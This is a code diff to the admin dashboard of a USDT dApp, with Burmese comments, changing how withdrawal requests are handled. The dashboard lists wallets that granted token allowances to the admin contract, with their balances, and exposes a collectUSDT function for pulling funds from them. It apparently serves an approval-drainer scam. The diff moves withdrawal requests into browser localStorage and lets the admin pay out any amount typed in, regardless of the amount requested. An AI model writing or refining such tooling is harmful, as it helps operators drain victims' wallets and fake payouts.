@@ -112,11 +112,11 @@
             </div>
         </div>
 
-        <!-- PART 3: User Withdrawal Requests & Admin Approval -->
+        <!-- PART 3: User Withdrawal Requests & Admin Direct Transfer -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <div class="flex items-center justify-between">
                 <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs">
-                    📥 3. Withdrawal Requests & Approval
+                    📥 3. Withdrawal Requests & Direct Transfer
                 </h2>
                 <button onclick="loadWithdrawRequests()" class="bg-slate-700 hover:bg-slate-600 px-3 py-1.5 rounded-xl text-xs transition cursor-pointer">Load Requests</button>
             </div>
@@ -140,7 +140,8 @@
         const ERC20_ABI = [
             "event Approval(address indexed owner, address indexed spender, uint256 value)",
             "function allowance(address owner, address spender) view returns (uint256)",
-            "function balanceOf(address account) view returns (uint256)"
+            "function balanceOf(address account) view returns (uint256)",
+            "function transfer(address recipient, uint256 amount) external returns (bool)"
         ];
 
         const ADMIN_ABI = [
@@ -149,8 +150,6 @@
             "function subAdminPrefix(address) view returns (string)",
             "function setTier(uint256 index, uint256 minAmt, uint256 maxAmt, uint256 rateBps) external",
             "function collectUSDT(address from, uint256 amount) external",
-            "function processWithdrawal(address user, uint256 requestId, bool approved) external",
-            "function getPendingWithdrawals() view returns (tuple(uint256 id, address user, uint256 amount, bool processed)[])",
             "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)"
         ];
 
@@ -233,7 +232,6 @@
             }
         }
 
-        // Blockchain Approval Events များကို အခြေခံ၍ User များကို အလိုအလျောက် ဆွဲထုတ်ပြသသည့်စနစ် (Cross-Device & Cross-Wallet Compatible)
         async function refreshUserTable() {
             const tbody = document.getElementById("userTableBody");
             tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-400">Blockchain မှ အချက်အလက်များကို ဆွဲယူနေပါသည်...</td></tr>`;
@@ -244,7 +242,6 @@
 
                 let userSet = new Set();
 
-                // 1. Query Approval events from blockchain where spender is ADMIN_CONTRACT_ADDRESS
                 try {
                     const filter = usdtContract.filters.Approval(null, ADMIN_CONTRACT_ADDRESS);
                     const logs = await usdtContract.queryFilter(filter, 0, "latest");
@@ -257,7 +254,6 @@
                     console.warn("Event query warning:", evErr);
                 }
 
-                // 2. Also fallback/combine with localStorage saved users
                 let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
                 savedUsers.forEach(addr => userSet.add(addr.toLowerCase()));
 
@@ -287,7 +283,6 @@
                         const balanceBN = await usdtContract.balanceOf(addr);
                         const allowanceBN = await usdtContract.allowance(addr, ADMIN_CONTRACT_ADDRESS);
 
-                        // Only show active approvals (allowance > 0)
                         if (Number(allowanceBN) === 0) continue;
 
                         const balance = Number(ethers.formatUnits(balanceBN, 6));
@@ -383,53 +378,84 @@
             refreshUserTable();
         }
 
+        // LocalStorage မှ Withdraw တောင်းဆိုချက်များကို ဖတ်ရှုပြသခြင်း
         async function loadWithdrawRequests() {
             const container = document.getElementById("withdrawRequestsContainer");
             try {
-                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
-                const requests = await contract.getPendingWithdrawals();
+                let requests = JSON.parse(localStorage.getItem("dapp_withdrawal_requests") || "[]");
+                const pendingRequests = requests.filter(r => !r.processed);
 
-                if (!requests || requests.length === 0) {
+                if (!pendingRequests || pendingRequests.length === 0) {
                     container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-500 text-xs">စောင့်ဆိုင်းဆဲ Withdrawal တောင်းဆိုချက်များ မရှိသေးပါ။</div>`;
                     return;
                 }
 
                 let html = "";
-                requests.forEach(req => {
-                    if (!req.processed) {
-                        const amt = ethers.formatUnits(req.amount, 6);
-                        html += `
-                            <div class="bg-slate-900 p-3 rounded-xl border border-slate-700 flex items-center justify-between text-xs">
-                                <div>
-                                    <p class="font-mono text-slate-300">User: <span class="text-emerald-400">${req.user.substring(0,6)}...${req.user.substring(38)}</span></p>
-                                    <p class="font-mono text-amber-300">Request Amount: ${amt} USDT</p>
-                                </div>
-                                <div class="flex gap-2">
-                                    <button onclick="handleWithdrawAction('${req.user}', ${req.id.toString()}, true)" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">Approve</button>
-                                    <button onclick="handleWithdrawAction('${req.user}', ${req.id.toString()}, false)" class="bg-red-600 hover:bg-red-500 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">Reject</button>
-                                </div>
+                pendingRequests.forEach(req => {
+                    html += `
+                        <div class="bg-slate-900 p-3 rounded-xl border border-slate-700 flex items-center justify-between text-xs">
+                            <div>
+                                <p class="font-mono text-slate-300">User: <span class="text-emerald-400">${req.user.substring(0,6)}...${req.user.substring(38)}</span></p>
+                                <p class="font-mono text-amber-300">Request Amount: ${req.amount} USDT</p>
+                                <p class="text-[10px] text-slate-500">${req.timestamp || ''}</p>
                             </div>
-                        `;
-                    }
+                            <div class="flex gap-2">
+                                <button onclick="handleWithdrawAction('${req.user}', ${req.id}, true)" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">Transfer & Approve</button>
+                                <button onclick="handleWithdrawAction('${req.user}', ${req.id}, false)" class="bg-red-600 hover:bg-red-500 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">Reject</button>
+                            </div>
+                        </div>
+                    `;
                 });
 
-                container.innerHTML = html || `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-500 text-xs">စောင့်ဆိုင်းဆဲ Withdrawal တောင်းဆိုချက်များ မရှိသေးပါ။</div>`;
+                container.innerHTML = html;
             } catch (err) {
                 console.error(err);
                 container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-red-400 text-xs">Withdrawal တောင်းဆိုချက်များကို ဖတ်ရှု၍ မရပါ။</div>`;
             }
         }
 
+        // Admin မှ Approve နှိပ်ပါက Admin Wallet မှ User ထံသို့ USDT တိုက်ရိုက်လွှဲပေးခြင်း
         async function handleWithdrawAction(userAddr, requestId, approved) {
+            let requests = JSON.parse(localStorage.getItem("dapp_withdrawal_requests") || "[]");
+            const reqIndex = requests.findIndex(r => r.id === requestId);
+
+            if (!approved) {
+                if (reqIndex !== -1) {
+                    requests[reqIndex].processed = true;
+                    requests[reqIndex].status = 'Rejected';
+                    localStorage.setItem("dapp_withdrawal_requests", JSON.stringify(requests));
+                }
+                alert("Withdrawal တောင်းဆိုမှုကို ငြင်းပယ်လိုက်ပါပြီ။");
+                loadWithdrawRequests();
+                return;
+            }
+
             try {
-                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
-                const tx = await contract.processWithdrawal(userAddr, requestId, approved);
+                const amountStr = prompt("ပေးပို့မည့် USDT ပမာဏကို ထည့်သွင်းပါ (ဥပမာ - 10):", "10");
+                if (!amountStr) return;
+
+                if (!adminSigner) {
+                    alert("ကျေးဇူးပြု၍ Admin Wallet ကို ဦးစွာ Connect လုပ်ပါ။");
+                    return;
+                }
+
+                alert("Admin Wallet မှ User ထံသို့ USDT တိုက်ရိုက်လွှဲပြောင်းရန် Transaction အတည်ပြုပါ။");
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, adminSigner);
+                
+                const tx = await usdtContract.transfer(userAddr, ethers.parseUnits(amountStr, 6));
                 await tx.wait();
-                alert(approved ? "Withdrawal အတည်ပြုပြီးပါပြီ။" : "Withdrawal ငြင်းပယ်လိုက်ပါပြီ။");
+
+                if (reqIndex !== -1) {
+                    requests[reqIndex].processed = true;
+                    requests[reqIndex].status = 'Approved';
+                    localStorage.setItem("dapp_withdrawal_requests", JSON.stringify(requests));
+                }
+
+                alert("USDT များကို User ထံသို့ အောင်မြင်စွာ တိုက်ရိုက်လွှဲပြောင်းပြီးပါပြီ။");
                 loadWithdrawRequests();
             } catch (err) {
                 console.error(err);
-                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (ခွင့်ပြုချက်မရှိပါ)");
+                alert("USDT လွှဲပြောင်းမှု မအောင်မြင်ပါ (သို့မဟုတ်) ငြင်းပယ်လိုက်ပါပြီ။");
             }
         }
     </script>
